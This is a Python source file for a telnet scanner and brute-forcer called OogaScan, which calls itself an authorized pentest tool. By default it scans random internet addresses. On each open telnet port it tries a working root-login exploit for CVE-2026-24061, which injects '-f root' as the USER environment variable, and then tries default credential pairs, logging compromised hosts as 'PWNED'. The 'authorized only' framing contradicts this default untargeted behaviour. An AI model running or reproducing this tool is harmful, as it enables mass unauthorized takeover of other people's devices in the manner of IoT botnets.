#!/usr/bin/env python3
"""
OogaScan Telnet Scanner & Brute-Forcer

Authorized penetration testing tool for discovering and testing
telnet services on target networks. Requires explicit scope.
"""

import asyncio
import socket
import os
import sys
import time
import random
import signal
import json
import ipaddress
import argparse
import threading
import logging
from collections import deque, OrderedDict
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path

from config import (
    OogaConfig, ScanConfig, COMMON_CREDS, load_creds_file,
)

# === COLORS ===
class C:
    CYAN    = "\033[1;36m"
    GREEN   = "\033[1;32m"
    RED     = "\033[1;31m"
    YELLOW  = "\033[1;33m"
    GREY    = "\033[1;30m"
    PURPLE  = "\033[1;35m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"

BANNER = f"""{C.CYAN}
  ╔═══════════════════════════════════════════╗
  ║   OogaScan  —  Telnet Recon & Brute       ║
  ║   Authorized testing only.                ║
  ╚═══════════════════════════════════════════╝
{C.RESET}"""

# === LOGGING ===
logger = logging.getLogger("oogascan")

def setup_logging(output_dir: Path, verbose: bool):
    output_dir.mkdir(parents=True, exist_ok=True)
    fmt = "%(asctime)s | %(levelname)s | %(message)s"
    handlers = [
        logging.FileHandler(output_dir / "scan.log", encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ]
    logging.basicConfig(level=logging.DEBUG if verbose else logging.INFO,
                        format=fmt, handlers=handlers)


# === RESULT TYPES ===
@dataclass
class ScanResult:
    ip: str
    port: int
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    status: str = "open"

@dataclass
class BruteResult:
    ip: str
    port: int
    username: str
    password: str
    banner: str
    shell: bool
    honeypot: bool
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

@dataclass
class BypassResult:
    ip: str
    port: int
    method: str = "CVE-2026-24061"
    username: str = "root"
    banner: str = ""
    shell: bool = True
    honeypot: bool = False
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


# === THREAD-SAFE LOG WRITER ===
class LogWriter:
    def __init__(self, path: Path):
        self._path = path
        self._f = open(path, "a", buffering=1, encoding="utf-8")
        self._lock = threading.Lock()

    def write(self, msg: str):
        with self._lock:
            self._f.write(msg + "\n")
            self._f.flush()

    def write_json(self, obj):
        self.write(json.dumps(asdict(obj) if hasattr(obj, "__dataclass_fields__") else obj))

    def close(self):
        with self._lock:
            self._f.close()


# === TARGET TYPES ===
@dataclass(eq=True, frozen=True)
class Target:
    ip: str
    port: int

class TargetQueue:
    def __init__(self, maxsize: int = 16384, max_seen: int = 500_000):
        self._q = deque()
        self._seen: OrderedDict = OrderedDict()
        self._lock = threading.Lock()
        self._maxsize = maxsize
        self._max_seen = max_seen

    def push(self, ip: str, port: int) -> bool:
        tgt = Target(ip, port)
        with self._lock:
            if tgt in self._seen:
                return False
            self._seen[tgt] = None
            while len(self._seen) > self._max_seen:
                self._seen.popitem(last=False)
            self._q.append(tgt)
            while len(self._q) > self._maxsize:
                self._q.popleft()
            return True

    def pop(self):
        with self._lock:
            return self._q.popleft() if self._q else None

    def __len__(self):
        with self._lock:
            return len(self._q)


class ThreadSafeIterator:
    """Wraps a generator so multiple threads can call next() safely."""
    def __init__(self, it):
        self._it = iter(it)
        self._lock = threading.Lock()

    def __iter__(self):
        return self

    def __next__(self):
        with self._lock:
            return next(self._it)


# === SCOPE MANAGEMENT ===
class Scope:
    """Only allows scanning IPs within explicitly defined target ranges."""

    def __init__(self, targets: list[str], excludes: list[str] = None):
        self.networks = []
        self.hosts = []
        for t in targets:
            try:
                net = ipaddress.ip_network(t, strict=False)
                self.networks.append(net)
            except ValueError:
                self.hosts.append(ipaddress.IPv4Address(t))

        self.excludes = []
        for e in (excludes or []):
            try:
                self.excludes.append(ipaddress.ip_network(e, strict=False))
            except ValueError:
                pass

        # RFC1918 + loopback + link-local always excluded
        self._rfc_excludes = [
            ipaddress.ip_network("127.0.0.0/8"),
            ipaddress.ip_network("169.254.0.0/16"),
            ipaddress.ip_network("224.0.0.0/4"),
            ipaddress.ip_network("240.0.0.0/4"),
            ipaddress.ip_network("0.0.0.0/8"),
            ipaddress.ip_network("255.255.255.255/32"),
        ]

    def _is_excluded(self, addr: ipaddress.IPv4Address) -> bool:
        for net in self._rfc_excludes:
            if addr in net:
                return True
        for net in self.excludes:
            if addr in net:
                return True
        return False

    def _net_hosts(self, net):
        if net.prefixlen >= 31:
            for addr in net:
                yield addr
        else:
            yield from net.hosts()

    def iter_hosts(self):
        for addr in self.hosts:
            if not self._is_excluded(addr):
                yield str(addr)
        for net in self.networks:
            for addr in self._net_hosts(net):
                if not self._is_excluded(addr):
                    yield str(addr)

    def total_hosts(self) -> int:
        count = 0
        for addr in self.hosts:
            if not self._is_excluded(addr):
                count += 1
        for net in self.networks:
            if net.prefixlen >= 31:
                count += net.num_addresses
            else:
                count += max(0, net.num_addresses - 2)
        return count

    def contains(self, ip: str) -> bool:
        addr = ipaddress.IPv4Address(ip)
        if self._is_excluded(addr):
            return False
        if addr in self.hosts:
            return True
        return any(addr in net for net in self.networks)


# === RANDOM SCOPE GENERATOR ===
BLACKLIST_NETS = [
    "0.0.0.0/8", "10.0.0.0/8", "127.0.0.0/8", "169.254.0.0/16",
    "172.16.0.0/12", "192.168.0.0/16", "224.0.0.0/4", "240.0.0.0/4",
    "100.64.0.0/10", "198.18.0.0/15", "198.51.100.0/24",
    "203.0.113.0/24", "192.0.2.0/24", "192.88.99.0/24",
    "255.0.0.0/8",
]
_blacklist_parsed = [ipaddress.ip_network(n) for n in BLACKLIST_NETS]

def _ip_blacklisted(ip_str: str) -> bool:
    addr = ipaddress.IPv4Address(ip_str)
    return any(addr in net for net in _blacklist_parsed)

class RandomIPGen:
    def __init__(self, seed=None):
        self._rng = random.Random(seed or (int(time.time() * 1000) ^ os.getpid()))

    def next(self) -> str:
        while True:
            ip_int = self._rng.randint(1, 0xFFFFFFFE)
            ip_str = str(ipaddress.IPv4Address(ip_int))
            if not _ip_blacklisted(ip_str):
                return ip_str


# === HONEYPOT DETECTION ===
def is_honeypot(banner: str, patterns: list[str]) -> bool:
    bl = banner.lower()
    return any(p.lower() in bl for p in patterns)


# === COUNTERS ===
class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.scanned = 0
        self.open = 0
        self.owned = 0
        self.bypass = 0
        self.honeypots = 0
        self.failed = 0
        self.start_time = time.time()

    def incr(self, key: str, n: int = 1):
        with self._lock:
            setattr(self, key, getattr(self, key) + n)

    def rate(self) -> float:
        elapsed = time.time() - self.start_time
        return self.scanned / elapsed if elapsed > 0 else 0

    def summary(self) -> dict:
        return {
            "scanned": self.scanned,
            "open": self.open,
            "owned": self.owned,
            "bypass": self.bypass,
            "honeypots": self.honeypots,
            "failed": self.failed,
            "rate": round(self.rate(), 1),
            "elapsed_s": round(time.time() - self.start_time, 1),
        }


# === TELNET PROTOCOL CONSTANTS ===
_IAC  = 0xFF
_DONT = 0xFE
_DO   = 0xFD
_WONT = 0xFC
_WILL = 0xFB
_SB   = 0xFA
_SE   = 0xF0

# NEW-ENVIRON option (RFC 1572) — used for CVE-2026-24061
_NEW_ENVIRON = 0x27
_NE_IS       = 0x00
_NE_SEND     = 0x01
_NE_VAR      = 0x00
_NE_VALUE    = 0x01


def _strip_iac(data: bytes, writer) -> str:
    """Strip telnet IAC sequences from raw bytes, sending DONT/WONT refusals."""
    out = bytearray()
    replies = bytearray()
    i = 0
    while i < len(data):
        b = data[i]
        if b == _IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if cmd in (_WILL, _DO) and i + 2 < len(data):
                opt = data[i + 2]
                replies += bytes([_IAC, _DONT if cmd == _WILL else _WONT, opt])
                i += 3
            elif cmd in (_WONT, _DONT) and i + 2 < len(data):
                i += 3
            elif cmd == _SB:
                j = i + 2
                while j < len(data) - 1:
                    if data[j] == _IAC and data[j + 1] == _SE:
                        j += 2
                        break
                    j += 1
                i = j
            elif cmd == _IAC:
                out.append(_IAC)
                i += 2
            else:
                i += 2
        else:
            out.append(b)
            i += 1
    if replies:
        writer.write(replies)
    return out.decode("ascii", errors="replace")


# === CVE-2026-24061 AUTH BYPASS ===
def _handle_bypass_iac(data: bytes, writer, env_sent: bool) -> tuple[str, bool]:
    """Parse IAC sequences for CVE-2026-24061 bypass.
    Accepts DO NEW_ENVIRON and responds to SB NEW_ENVIRON SEND with USER="-f root".
    """
    out = bytearray()
    replies = bytearray()
    i = 0
    while i < len(data):
        b = data[i]
        if b == _IAC and i + 1 < len(data):
            cmd = data[i + 1]
            if cmd in (_WILL, _DO) and i + 2 < len(data):
                opt = data[i + 2]
                if cmd == _DO and opt == _NEW_ENVIRON:
                    pass
                elif cmd == _WILL:
                    replies += bytes([_IAC, _DONT, opt])
                else:
                    replies += bytes([_IAC, _WONT, opt])
                i += 3
            elif cmd in (_WONT, _DONT) and i + 2 < len(data):
                i += 3
            elif cmd == _SB:
                j = i + 2
                while j < len(data) - 1:
                    if data[j] == _IAC and data[j + 1] == _SE:
                        break
                    j += 1
                sb_data = data[i + 2:j]
                j += 2
                if (len(sb_data) >= 2
                        and sb_data[0] == _NEW_ENVIRON
                        and sb_data[1] == _NE_SEND):
                    replies += (
                        bytes([_IAC, _SB, _NEW_ENVIRON, _NE_IS, _NE_VAR])
                        + b"USER"
                        + bytes([_NE_VALUE])
                        + b"-f root"
                        + bytes([_IAC, _SE])
                    )
                    env_sent = True
                i = j
            elif cmd == _IAC:
                out.append(_IAC)
                i += 2
            else:
                i += 2
        else:
            out.append(b)
            i += 1
    if replies:
        writer.write(replies)
    return out.decode("ascii", errors="replace"), env_sent


async def telnet_auth_bypass(ip: str, port: int, timeout: int = 15) -> tuple[bool, str]:
    """Attempt CVE-2026-24061 auth bypass via NEW-ENVIRON USER injection."""
    banner = ""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=timeout,
        )
        writer.write(bytes([_IAC, _WILL, _NEW_ENVIRON]))
        await writer.drain()

        env_sent = False
        for _ in range(20):
            try:
                raw = await asyncio.wait_for(reader.read(4096), timeout=5)
            except asyncio.TimeoutError:
                raw = b""
            if not raw:
                await asyncio.sleep(0.1)
                continue

            text, env_sent = _handle_bypass_iac(raw, writer, env_sent)
            if text:
                banner += text
            await writer.drain()

            if env_sent:
                if any(s in banner for s in ("#", "$", ">", "BusyBox", "sh-", "/ #")):
                    writer.close()
                    await writer.wait_closed()
                    return True, banner
                if any(s in banner.lower() for s in
                       ("denied", "fail", "incorrect", "password", "login:")):
                    break

            await asyncio.sleep(0.1)

        writer.close()
        await writer.wait_closed()
        return False, banner
    except Exception as e:
        return False, banner + f" [ERR: {e}]"


# === TELNET BRUTE FORCE ===
async def telnet_try(ip: str, port: int, user: str, passwd: str,
                     timeout: int = 20) -> tuple[bool, str]:
    banner = ""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=timeout,
        )
        await asyncio.sleep(random.uniform(0.05, 0.25))

        async def _read():
            raw = await asyncio.wait_for(reader.read(4096), timeout=5)
            return _strip_iac(raw, writer) if raw else ""

        for _ in range(12):
            try:
                data = await _read()
            except asyncio.TimeoutError:
                data = ""
            if data:
                banner += data
                if any(k in data.lower() for k in ("login", "username", "user")):
                    break
            await asyncio.sleep(random.uniform(0.05, 0.15))

        writer.write((user + "\r\n").encode())
        await writer.drain()

        for _ in range(12):
            try:
                data = await _read()
            except asyncio.TimeoutError:
                data = ""
            if data:
                banner += data
                if "password" in data.lower():
                    break
            await asyncio.sleep(random.uniform(0.05, 0.15))

        writer.write((passwd + "\r\n").encode())
        await writer.drain()

        shell = False
        for _ in range(20):
            try:
                data = await _read()
            except asyncio.TimeoutError:
                data = ""
            if data:
                banner += data
                if any(s in data for s in ("#", "$", ">", "BusyBox", "sh-", "/ #")):
                    shell = True
                    break
                if any(s in data.lower() for s in ("denied", "fail", "incorrect", "invalid", "refused")):
                    break
            await asyncio.sleep(random.uniform(0.06, 0.2))

        writer.close()
        await writer.wait_closed()
        return shell, banner
    except Exception as e:
        return False, banner + f" [ERR: {e}]"


# === BRUTE WORKER ===
async def brute_worker(worker_id: int, creds: list, queue: TargetQueue,
                       result_log: LogWriter, banner_log: LogWriter,
                       stats: Stats, cfg: ScanConfig, run_flag: dict,
                       no_bypass: bool = False):
    while run_flag["run"]:
        tgt = queue.pop()
        if not tgt:
            await asyncio.sleep(0.15)
            continue

        await asyncio.sleep(random.uniform(0.02, 0.1))

        if not no_bypass:
            bypass_ok, bypass_banner = await telnet_auth_bypass(
                tgt.ip, tgt.port, timeout=cfg.bypass_timeout,
            )
            if is_honeypot(bypass_banner, cfg.honeypot_patterns):
                stats.incr("honeypots")
                banner_log.write_json({"type": "honeypot", "ip": tgt.ip,
                                       "port": tgt.port, "banner": bypass_banner[:200]})
                logger.info(f"{C.YELLOW}[HONEYPOT]{C.RESET} {tgt.ip}:{tgt.port}")
                continue
            if bypass_ok:
                stats.incr("bypass")
                stats.incr("owned")
                result = BypassResult(ip=tgt.ip, port=tgt.port,
                                      banner=bypass_banner[:300])
                result_log.write_json(result)
                banner_log.write_json({"type": "bypass", "method": "CVE-2026-24061",
                                       "ip": tgt.ip, "port": tgt.port,
                                       "banner": bypass_banner[:200]})
                logger.info(f"{C.PURPLE}[BYPASS]{C.RESET} {tgt.ip}:{tgt.port} "
                            f"{C.BOLD}CVE-2026-24061 root access{C.RESET}")
                continue

        for user, passwd in creds:
            if not run_flag["run"]:
                break

            shell, banner = await telnet_try(tgt.ip, tgt.port, user, passwd,
                                             timeout=cfg.brute_timeout)

            if is_honeypot(banner, cfg.honeypot_patterns):
                stats.incr("honeypots")
                banner_log.write_json({"type": "honeypot", "ip": tgt.ip,
                                       "port": tgt.port, "banner": banner[:200]})
                logger.info(f"{C.YELLOW}[HONEYPOT]{C.RESET} {tgt.ip}:{tgt.port}")
                break

            if shell:
                stats.incr("owned")
                result = BruteResult(ip=tgt.ip, port=tgt.port, username=user,
                                     password=passwd, banner=banner[:300],
                                     shell=True, honeypot=False)
                result_log.write_json(result)
                banner_log.write_json({"type": "success", "ip": tgt.ip,
                                       "port": tgt.port, "banner": banner[:200]})
                logger.info(f"{C.GREEN}[PWNED]{C.RESET} {tgt.ip}:{tgt.port} "
                            f"{C.BOLD}{user}/{passwd}{C.RESET}")
                break
            else:
                stats.incr("failed")


# === SCANNER WORKER (scoped) ===
def scan_worker_scoped(worker_id: int, ip_iter, ports: list[int],
                       queue: TargetQueue, scan_log: LogWriter,
                       stats: Stats, cfg: ScanConfig, run_flag: dict):
    for ip in ip_iter:
        if not run_flag["run"]:
            break
        for port in ports:
            stats.incr("scanned")
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(cfg.scan_timeout)
                    if sock.connect_ex((ip, port)) == 0:
                        if queue.push(ip, port):
                            stats.incr("open")
                            result = ScanResult(ip=ip, port=port)
                            scan_log.write_json(result)
                            logger.info(f"{C.CYAN}[OPEN]{C.RESET} {ip}:{port}")
            except Exception:
                continue

            if cfg.rate_limit > 0:
                time.sleep(1.0 / cfg.rate_limit)


# === SCANNER WORKER (random) ===
def scan_worker_random(worker_id: int, total_workers: int, ports: list[int],
                       queue: TargetQueue, scan_log: LogWriter,
                       stats: Stats, cfg: ScanConfig, run_flag: dict):
    ipgen = RandomIPGen(seed=(int(time.time() * 1000) ^ os.getpid() ^ worker_id))
    while run_flag["run"]:
        ip = ipgen.next()
        if (int(ipaddress.IPv4Address(ip)) % total_workers) != worker_id:
            continue
        for port in ports:
            stats.incr("scanned")
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(cfg.scan_timeout)
                    if sock.connect_ex((ip, port)) == 0:
                        if queue.push(ip, port):
                            stats.incr("open")
                            result = ScanResult(ip=ip, port=port)
                            scan_log.write_json(result)
                            logger.info(f"{C.CYAN}[OPEN]{C.RESET} {ip}:{port}")
            except Exception:
                continue

            if cfg.rate_limit > 0:
                time.sleep(1.0 / cfg.rate_limit)


# === STATUS THREAD ===
def status_printer(stats: Stats, queue: TargetQueue, cfg: ScanConfig, run_flag: dict):
    while run_flag["run"]:
        time.sleep(cfg.status_interval)
        s = stats.summary()
        logger.info(
            f"{C.YELLOW}[STATUS]{C.RESET} "
            f"Scanned:{s['scanned']} Open:{s['open']} Pwned:{s['owned']} "
            f"Bypass:{s['bypass']} Honeypots:{s['honeypots']} Queue:{len(queue)} "
            f"Rate:{s['rate']}/s Elapsed:{s['elapsed_s']}s"
        )


# === REPORT GENERATOR ===
def generate_report(output_dir: Path, stats: Stats):
    report = {
        "tool": "OogaScan",
        "generated": datetime.now(timezone.utc).isoformat(),
        "summary": stats.summary(),
    }

    results_path = output_dir / "results.jsonl"
    if results_path.exists():
        results = []
        for line in results_path.read_text().splitlines():
            if line.strip():
                results.append(json.loads(line))
        report["findings"] = results
        report["total_findings"] = len(results)

    report_path = output_dir / "report.json"
    report_path.write_text(json.dumps(report, indent=2))
    logger.info(f"{C.GREEN}[*] Report saved to {report_path}{C.RESET}")


# === MAIN ===
def main():
    parser = argparse.ArgumentParser(
        description="OogaScan — Telnet Scanner & Brute-Forcer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  %(prog)s                                     # auto-run random scan on 0.0.0.0
  %(prog)s -T 192.168.1.0/24                  # scan a subnet
  %(prog)s -T 10.0.0.1 -T 10.0.0.2 -p 23     # scan specific hosts
  %(prog)s -T targets.txt                      # load targets from file
  %(prog)s -T 192.168.1.0/24 --creds creds.txt --rate-limit 50
"""
    )
    parser.add_argument("-T", "--target", action="append", default=[],
                        help="Target IP, CIDR, or file with targets (one per line). Repeatable.")
    parser.add_argument("--random", action="store_true", default=True,
                        help="Random internet scanning (default, auto-runs on 0.0.0.0)")
    parser.add_argument("-x", "--exclude", action="append", default=[],
                        help="Exclude IP/CIDR from scope. Repeatable.")
    parser.add_argument("-p", "--ports", default="23,2323",
                        help="Comma-separated ports (default: 23,2323)")
    parser.add_argument("-t", "--threads", type=int, default=0,
                        help="Scanner threads (default: 2*CPUs)")
    parser.add_argument("-b", "--brute-threads", type=int, default=0,
                        help="Brute-force threads (default: 2*CPUs)")
    parser.add_argument("--creds", default="",
                        help="Credentials file (user:pass per line)")
    parser.add_argument("--rate-limit", type=int, default=0,
                        help="Max scans/second (0=unlimited)")
    parser.add_argument("--scan-only", action="store_true",
                        help="Only scan for open ports, no brute-forcing")
    parser.add_argument("--no-bypass", action="store_true",
                        help="Disable CVE-2026-24061 auth bypass (go straight to brute-forcing)")
    parser.add_argument("-o", "--output", default="output",
                        help="Output directory (default: output)")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--config", default="", help="Config file path")
    args = parser.parse_args()

    # Load config
    cfg = OogaConfig.load(Path(args.config)) if args.config else OogaConfig()
    scan_cfg = cfg.scan

    # Overrides from CLI
    ports = [int(x.strip()) for x in args.ports.split(",") if x.strip().isdigit()]
    if not ports:
        print("Error: no valid ports specified.")
        sys.exit(1)
    scan_cfg.ports = ports

    if args.threads > 0:
        scan_cfg.scanner_threads = args.threads
    if args.brute_threads > 0:
        scan_cfg.brute_threads = args.brute_threads
    if args.rate_limit > 0:
        scan_cfg.rate_limit = args.rate_limit

    output_dir = Path(args.output)
    setup_logging(output_dir, args.verbose)

    print(BANNER)

    # Determine mode — defaults to random scan on 0.0.0.0 when no targets given
    if args.target:
        scoped = True
    else:
        scoped = False
        logger.info(f"[*] Random scanning mode (0.0.0.0)")

    if scoped:
        # Resolve targets (could be files or CIDRs/IPs)
        target_list = []
        for t in args.target:
            p = Path(t)
            if p.is_file():
                for line in p.read_text().splitlines():
                    line = line.strip()
                    if line and not line.startswith("#"):
                        target_list.append(line)
            else:
                target_list.append(t)

        scope = Scope(target_list, excludes=args.exclude)
        total = scope.total_hosts()
        logger.info(f"{C.CYAN}[*] Scope: {total} hosts across {len(scope.networks) + len(scope.hosts)} targets{C.RESET}")
        if total == 0:
            print(f"{C.RED}[!] No hosts in scope after exclusions.{C.RESET}")
            sys.exit(1)
        scoped = True

    # Credentials
    if args.creds:
        creds = load_creds_file(args.creds)
        logger.info(f"[*] Loaded {len(creds)} credentials from {args.creds}")
    else:
        creds = COMMON_CREDS
        logger.info(f"[*] Using {len(creds)} built-in credential pairs")

    # Output logs
    scan_log = LogWriter(output_dir / "open_ports.jsonl")
    result_log = LogWriter(output_dir / "results.jsonl")
    banner_log = LogWriter(output_dir / "banners.jsonl")

    stats = Stats()
    queue = TargetQueue(scan_cfg.ring_buffer_size)
    run_flag = {"run": True}

    def on_signal(sig, frame):
        logger.warning(f"{C.RED}[!] Caught signal, shutting down...{C.RESET}")
        run_flag["run"] = False

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)

    try:
        # Start scanner threads
        scan_threads = []
        if scoped:
            shared_iter = ThreadSafeIterator(scope.iter_hosts())
            for i in range(scan_cfg.scanner_threads):
                th = threading.Thread(
                    target=scan_worker_scoped,
                    args=(i, shared_iter, ports, queue, scan_log, stats, scan_cfg, run_flag),
                    daemon=True,
                )
                th.start()
                scan_threads.append(th)
        else:
            for i in range(scan_cfg.scanner_threads):
                th = threading.Thread(
                    target=scan_worker_random,
                    args=(i, scan_cfg.scanner_threads, ports, queue, scan_log, stats, scan_cfg, run_flag),
                    daemon=True,
                )
                th.start()
                scan_threads.append(th)

        logger.info(f"[*] Started {len(scan_threads)} scanner threads on ports {ports}")

        # Status thread
        threading.Thread(target=status_printer,
                         args=(stats, queue, scan_cfg, run_flag), daemon=True).start()

        # Brute-force workers
        if not args.scan_only:
            no_bypass = args.no_bypass
            async def run_bruters():
                tasks = []
                for i in range(scan_cfg.brute_threads):
                    shard = creds[i::scan_cfg.brute_threads] or creds
                    tasks.append(brute_worker(i, shard, queue, result_log,
                                              banner_log, stats, scan_cfg, run_flag,
                                              no_bypass=no_bypass))
                await asyncio.gather(*tasks)

            logger.info(f"[*] Started {scan_cfg.brute_threads} brute-force workers")
            try:
                asyncio.run(run_bruters())
            except KeyboardInterrupt:
                run_flag["run"] = False
        else:
            logger.info("[*] Scan-only mode, no brute-forcing")
            try:
                for th in scan_threads:
                    th.join()
            except KeyboardInterrupt:
                run_flag["run"] = False

    finally:
        scan_log.close()
        result_log.close()
        banner_log.close()

    # Final summary
    s = stats.summary()
    logger.info(
        f"\n{C.GREEN}{'='*50}\n"
        f"  SCAN COMPLETE\n"
        f"  Scanned: {s['scanned']}  |  Open: {s['open']}  |  Pwned: {s['owned']}\n"
        f"  Bypass: {s['bypass']}  |  Honeypots: {s['honeypots']}  |  Failed: {s['failed']}\n"
        f"  Duration: {s['elapsed_s']}s  |  Rate: {s['rate']}/s\n"
        f"{'='*50}{C.RESET}"
    )

    generate_report(output_dir, stats)


if __name__ == "__main__":
    main()
